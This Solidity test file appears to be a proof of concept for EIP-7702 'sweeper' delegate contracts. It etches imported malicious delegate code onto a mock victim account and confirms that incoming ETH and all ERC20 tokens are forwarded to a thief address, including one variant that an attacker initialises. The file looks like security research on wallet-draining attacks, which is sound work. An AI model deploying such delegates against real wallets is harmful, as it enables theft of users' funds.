// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {AdvancedCrimeEnjoyor2, CrimeEnjoyor2} from "../src/MaliciousDelegates.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function etch(address where, bytes calldata code) external;
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MaliciousDelegateSweeperPoC {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    address internal constant VICTIM_EOA = address(0x7702000000000000000000000000000000000001);
    address payable internal constant THIEF = payable(0xBEEf000000000000000000000000000000000001);

    function testAdvancedDelegateSweepsIncomingEthFromDelegatedEoa() public {
        vm.deal(address(this), 10 ether);

        AdvancedCrimeEnjoyor2 implementation = new AdvancedCrimeEnjoyor2(
            bytes32(uint256(uint160(address(THIEF)))),
            bytes32(0)
        );
        vm.etch(VICTIM_EOA, address(implementation).code);

        uint256 thiefBefore = THIEF.balance;
        (bool ok,) = payable(VICTIM_EOA).call{value: 1 ether}("");

        require(ok, "send to delegated EOA failed");
        require(THIEF.balance == thiefBefore + 1 ether, "thief did not receive ETH");
        require(VICTIM_EOA.balance == 0, "victim EOA kept ETH");
    }

    function testAdvancedDelegateSweepsAllTokensFromDelegatedEoa() public {
        AdvancedCrimeEnjoyor2 implementation = new AdvancedCrimeEnjoyor2(
            bytes32(uint256(uint160(address(THIEF)))),
            bytes32(0)
        );
        vm.etch(VICTIM_EOA, address(implementation).code);

        MockERC20 token = new MockERC20();
        token.mint(VICTIM_EOA, 1_000 ether);

        (bool ok,) = VICTIM_EOA.call(abi.encodeWithSignature("transferTokens(address)", address(token)));

        require(ok, "token sweep call failed");
        require(token.balanceOf(THIEF) == 1_000 ether, "thief did not receive tokens");
        require(token.balanceOf(VICTIM_EOA) == 0, "victim EOA kept tokens");
    }

    function testCrimeEnjoyorCanBeInitializedThenSweepsIncomingEth() public {
        vm.deal(address(this), 10 ether);

        CrimeEnjoyor2 implementation = new CrimeEnjoyor2();
        vm.etch(VICTIM_EOA, address(implementation).code);

        (bool initOk,) = VICTIM_EOA.call(
            abi.encodeWithSignature("initLoser_863360385(address)", THIEF)
        );
        require(initOk, "attacker could not initialize thief sink");

        uint256 thiefBefore = THIEF.balance;
        (bool sendOk,) = payable(VICTIM_EOA).call{value: 1 ether}("");

        require(sendOk, "send to delegated EOA failed");
        require(THIEF.balance == thiefBefore + 1 ether, "thief did not receive ETH");
        require(VICTIM_EOA.balance == 0, "victim EOA kept ETH");
    }
}
